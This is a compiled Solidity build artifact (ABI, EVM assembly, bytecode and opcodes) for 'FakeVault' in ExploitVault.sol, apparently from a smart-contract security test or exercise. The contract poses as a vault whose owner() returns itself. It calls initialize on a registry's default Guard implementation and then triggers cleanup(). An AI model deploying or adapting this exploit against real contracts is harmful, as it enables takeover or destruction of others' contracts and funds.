{
  "contracts/vault/ExploitVault.sol": {
    "FakeVault": {
      "abi": [
        {
          "constant": false,
          "inputs": [],
          "name": "cleanup",
          "outputs": [],
          "payable": false,
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "constant": true,
          "inputs": [],
          "name": "guard",
          "outputs": [
            {
              "name": "",
              "type": "address"
            }
          ],
          "payable": false,
          "stateMutability": "view",
          "type": "function"
        },
        {
          "constant": false,
          "inputs": [],
          "name": "owner",
          "outputs": [
            {
              "name": "",
              "type": "address"
            }
          ],
          "payable": false,
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "name": "registry",
              "type": "address"
            }
          ],
          "payable": false,
          "stateMutability": "nonpayable",
          "type": "constructor"
        }
      ],
      "devdoc": {
        "methods": {}
      },
      "evm": {
        "assembly": "    /* \"contracts/vault/ExploitVault.sol\":53:446  contract FakeVault {... */\n  mstore(0x40, 0x60)\n    /* \"contracts/vault/ExploitVault.sol\":103:243  function FakeVault(GuardRegistry registry) public {... */\n  jumpi(tag_1, iszero(callvalue))\n  0x0\n  dup1\n  revert\ntag_1:\n  mload(0x40)\n  0x20\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  mstore\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap2\n  swap1\n  pop\n  pop\ntag_2:\n    /* \"contracts/vault/ExploitVault.sol\":177:185  registry */\n  dup1\n    /* \"contracts/vault/ExploitVault.sol\":177:201  registry.implementations */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x2cfeaca\n    /* \"contracts/vault/ExploitVault.sol\":202:210  registry */\n  dup3\n    /* \"contracts/vault/ExploitVault.sol\":202:232  registry.defaultImplementation */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xb39c4593\n    /* \"contracts/vault/ExploitVault.sol\":202:234  registry.defaultImplementation() */\n  mstore(add(0x20, mload(0x40)), 0x0)\n  mload(0x40)\n  dup2\n  0xffffffff\n  and\n  0x100000000000000000000000000000000000000000000000000000000\n  mul\n  dup2\n  mstore\n  0x4\n  add\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  0x0\n  dup8\n  dup1\n  extcodesize\n  iszero\n  iszero\n  tag_4\n  jumpi\n  0x0\n  dup1\n  revert\ntag_4:\n  sub(gas, 0x2c6)\n  call\n  iszero\n  iszero\n  tag_5\n  jumpi\n  0x0\n  dup1\n  revert\ntag_5:\n  pop\n  pop\n  pop\n  mload(0x40)\n  dup1\n  mload\n  swap1\n  pop\n    /* \"contracts/vault/ExploitVault.sol\":177:235  registry.implementations(registry.defaultImplementation()) */\n  mstore(add(0x20, mload(0x40)), 0x0)\n  mload(0x40)\n  dup3\n  0xffffffff\n  and\n  0x100000000000000000000000000000000000000000000000000000000\n  mul\n  dup2\n  mstore\n  0x4\n  add\n  dup1\n  dup3\n  not(0x0)\n  and\n  not(0x0)\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\n  pop\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  0x0\n  dup8\n  dup1\n  extcodesize\n  iszero\n  iszero\n  tag_6\n  jumpi\n  0x0\n  dup1\n  revert\ntag_6:\n  sub(gas, 0x2c6)\n  call\n  iszero\n  iszero\n  tag_7\n  jumpi\n  0x0\n  dup1\n  revert\ntag_7:\n  pop\n  pop\n  pop\n  mload(0x40)\n  dup1\n  mload\n  swap1\n  pop\n    /* \"contracts/vault/ExploitVault.sol\":163:168  guard */\n  0x0\n  dup1\n    /* \"contracts/vault/ExploitVault.sol\":163:236  guard = Guard(registry.implementations(registry.defaultImplementation())) */\n  0x100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/vault/ExploitVault.sol\":103:243  function FakeVault(GuardRegistry registry) public {... */\ntag_3:\n  pop\n    /* \"contracts/vault/ExploitVault.sol\":53:446  contract FakeVault {... */\ntag_8:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/vault/ExploitVault.sol\":53:446  contract FakeVault {... */\n      mstore(0x40, 0x60)\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x3cecd719\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x7ceab3b1\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_4\n      jumpi\n    tag_1:\n      0x0\n      dup1\n      revert\n        /* \"contracts/vault/ExploitVault.sol\":253:359  function cleanup() public {... */\n    tag_2:\n      jumpi(tag_5, iszero(callvalue))\n      0x0\n      dup1\n      revert\n    tag_5:\n      tag_6\n      jump(tag_7)\n    tag_6:\n      stop\n        /* \"contracts/vault/ExploitVault.sol\":78:96  Guard public guard */\n    tag_3:\n      jumpi(tag_8, iszero(callvalue))\n      0x0\n      dup1\n      revert\n    tag_8:\n      tag_9\n      jump(tag_10)\n    tag_9:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/vault/ExploitVault.sol\":365:444  function owner() public returns (address) {... */\n    tag_4:\n      jumpi(tag_11, iszero(callvalue))\n      0x0\n      dup1\n      revert\n    tag_11:\n      tag_12\n      jump(tag_13)\n    tag_12:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/vault/ExploitVault.sol\":253:359  function cleanup() public {... */\n    tag_7:\n        /* \"contracts/vault/ExploitVault.sol\":289:294  guard */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/vault/ExploitVault.sol\":289:305  guard.initialize */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xc4d66de8\n        /* \"contracts/vault/ExploitVault.sol\":320:324  this */\n      address\n        /* \"contracts/vault/ExploitVault.sol\":289:327  guard.initialize(Vault(address(this))) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n      iszero\n      tag_15\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_15:\n      sub(gas, 0x2c6)\n      call\n      iszero\n      iszero\n      tag_16\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_16:\n      pop\n      pop\n      pop\n        /* \"contracts/vault/ExploitVault.sol\":337:342  guard */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/vault/ExploitVault.sol\":337:350  guard.cleanup */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3cecd719\n        /* \"contracts/vault/ExploitVault.sol\":337:352  guard.cleanup() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n      iszero\n      tag_17\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_17:\n      sub(gas, 0x2c6)\n      call\n      iszero\n      iszero\n      tag_18\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_18:\n      pop\n      pop\n      pop\n        /* \"contracts/vault/ExploitVault.sol\":253:359  function cleanup() public {... */\n    tag_14:\n      jump\t// out\n        /* \"contracts/vault/ExploitVault.sol\":78:96  Guard public guard */\n    tag_10:\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/vault/ExploitVault.sol\":365:444  function owner() public returns (address) {... */\n    tag_13:\n        /* \"contracts/vault/ExploitVault.sol\":398:405  address */\n      0x0\n        /* \"contracts/vault/ExploitVault.sol\":432:436  this */\n      address\n        /* \"contracts/vault/ExploitVault.sol\":417:437  return address(this) */\n      swap1\n      pop\n        /* \"contracts/vault/ExploitVault.sol\":365:444  function owner() public returns (address) {... */\n    tag_19:\n      swap1\n      jump\t// out\n\n    auxdata: 0xa165627a7a72305820c06ada0081e48a81e21d9ce4c211a38717bf0ad3346d7d5fdadb52381ea2faac0029\n}\n",
        "bytecode": {
          "linkReferences": {},
          "object": "6060604052341561000f57600080fd5b604051602080610474833981016040528080519060200190919050505b8073ffffffffffffffffffffffffffffffffffffffff166302cfeaca8273ffffffffffffffffffffffffffffffffffffffff1663b39c45936000604051602001526040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156100b457600080fd5b6102c65a03f115156100c557600080fd5b505050604051805190506000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808260001916600019168152602001915050602060405180830381600087803b151561013157600080fd5b6102c65a03f1151561014257600080fd5b505050604051805190506000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b505b6102d78061019d6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633cecd719146100545780637ceab3b1146100695780638da5cb5b146100be575b600080fd5b341561005f57600080fd5b610067610113565b005b341561007457600080fd5b61007c61027d565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156100c957600080fd5b6100d16102a2565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c4d66de8306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15156101ce57600080fd5b6102c65a03f115156101df57600080fd5b5050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633cecd7196040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561026657600080fd5b6102c65a03f1151561027757600080fd5b5050505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60003090505b905600a165627a7a72305820c06ada0081e48a81e21d9ce4c211a38717bf0ad3346d7d5fdadb52381ea2faac0029",
          "opcodes": "PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH2 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP1 PUSH2 0x474 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 MSTORE DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP2 SWAP1 POP POP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2CFEACA DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xB39C4593 PUSH1 0x0 PUSH1 0x40 MLOAD PUSH1 0x20 ADD MSTORE PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0xB4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0xC5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP PUSH1 0x40 MLOAD DUP1 MLOAD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD PUSH1 0x20 ADD MSTORE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH1 0x0 NOT AND PUSH1 0x0 NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x131 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0x142 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP PUSH1 0x40 MLOAD DUP1 MLOAD SWAP1 POP PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMPDEST POP JUMPDEST PUSH2 0x2D7 DUP1 PUSH2 0x19D PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x3CECD719 EQ PUSH2 0x54 JUMPI DUP1 PUSH4 0x7CEAB3B1 EQ PUSH2 0x69 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xBE JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE ISZERO PUSH2 0x5F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x67 PUSH2 0x113 JUMP JUMPDEST STOP JUMPDEST CALLVALUE ISZERO PUSH2 0x74 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x7C PUSH2 0x27D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE ISZERO PUSH2 0xC9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xD1 PUSH2 0x2A2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC4D66DE8 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x1CE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0x1DF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CECD719 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x266 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0x277 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 ADDRESS SWAP1 POP JUMPDEST SWAP1 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xc0 PUSH11 0xDA0081E48A81E21D9CE4C2 GT LOG3 DUP8 OR 0xbf EXP 0xd3 CALLVALUE PUSH14 0x7D5FDADB52381EA2FAAC00290000 "
        },
        "gasEstimates": {
          "creation": {
            "codeDepositCost": "145400",
            "executionCost": "infinite",
            "totalCost": "infinite"
          },
          "external": {
            "cleanup()": "infinite",
            "guard()": "435",
            "owner()": "229"
          }
        },
        "methodIdentifiers": {
          "cleanup()": "3cecd719",
          "guard()": "7ceab3b1",
          "owner()": "8da5cb5b"
        }
      },
      "userdoc": {
        "methods": {}
      }
    }
  }
}